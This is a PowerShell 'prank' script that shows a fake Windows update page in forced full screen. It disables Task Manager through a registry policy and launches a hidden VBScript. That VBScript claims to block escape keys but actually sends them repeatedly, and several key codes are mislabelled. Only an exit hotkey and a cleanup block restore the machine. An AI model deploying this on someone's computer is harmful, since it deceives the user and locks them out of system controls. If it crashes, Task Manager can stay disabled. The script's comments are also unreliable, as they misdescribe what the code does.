# Start Internet Explorer and navigate to the fake update page
$ie = New-Object -ComObject InternetExplorer.Application
$ie.Visible = $true
$ie.Navigate("https://fakeupdate.net/win10ue/")

# Wait for the page to load
Start-Sleep -Seconds 5

# Simulate F11 key to enter full screen
Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;

public class Keyboard {
    [DllImport("user32.dll", SetLastError = true)]
    public static extern void keybd_event(byte bVk, byte bScan, uint dwFlags, UIntPtr dwExtraInfo);
    
    public const int KEYEVENTF_KEYUP = 0x0002;
    public const int VK_F11 = 0x7A;

    public static void PressF11() {
        keybd_event(VK_F11, 0, 0, UIntPtr.Zero);
        keybd_event(VK_F11, 0, KEYEVENTF_KEYUP, UIntPtr.Zero);
    }
}
"@
[Keyboard]::PressF11()

# Create a registry entry to disable Task Manager (Ctrl+Alt+Del and Ctrl+Shift+Esc)
Write-Host "Disabling Task Manager..."
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "DisableTaskMgr" /t REG_DWORD /d 1 /f

# Disable Windows Key, Alt+Tab, Ctrl+Esc, Alt+F4, and F11 using a VBScript
$vbscript = @"
Set objShell = CreateObject("WScript.Shell")
Do
    objShell.SendKeys "{F11}" ' Prevent exiting full screen
    objShell.SendKeys "^{ESC}" ' Block Ctrl+Esc
    objShell.SendKeys "^{F4}" ' Block Alt+F4
    objShell.SendKeys "%{TAB}" ' Block Alt+Tab
    objShell.SendKeys "^{ALT}{DEL}" ' Block Ctrl+Alt+Del
    objShell.SendKeys "^{+}{ESC}" ' Block Ctrl+Shift+Esc
    objShell.SendKeys "^{LWIN}" ' Block Left Windows Key
    objShell.SendKeys "^{RWIN}" ' Block Right Windows Key
    WScript.Sleep 100
Loop
"@

# Save the VBScript to a temp location and execute it
$vbPath = "$env:TEMP\blockkeys.vbs"
$vbscript | Out-File -Encoding ASCII -FilePath $vbPath
Start-Process "wscript.exe" -ArgumentList "$vbPath" -WindowStyle Hidden

# Background key listener for emergency exit (Ctrl + Shift + X)
Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
using System.Threading;

public class KeyListener {
    [DllImport("user32.dll")]
    public static extern short GetAsyncKeyState(int vKey);

    public static void ListenForExit() {
        while (true) {
            bool ctrl = (GetAsyncKeyState(0x11) & 0x8000) != 0; // Ctrl key
            bool shift = (GetAsyncKeyState(0x10) & 0x8000) != 0; // Shift key
            bool x = (GetAsyncKeyState(0x58) & 0x8000) != 0; // X key

            if (ctrl && shift && x) {
                break;
            }
            Thread.Sleep(100);
        }
    }
}
"@ -Language CSharp

Write-Host "Prank is running. Press Ctrl + Shift + X to exit."
[KeyListener]::ListenForExit()

# Cleanup: Restore Task Manager, Kill the VBScript, and Close Browser
Write-Host "Exiting prank..."
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "DisableTaskMgr" /f
Stop-Process -Name "wscript" -Force -ErrorAction SilentlyContinue
Stop-Process -Name "iexplore" -Force -ErrorAction SilentlyContinue
Write-Host "Prank stopped successfully!"
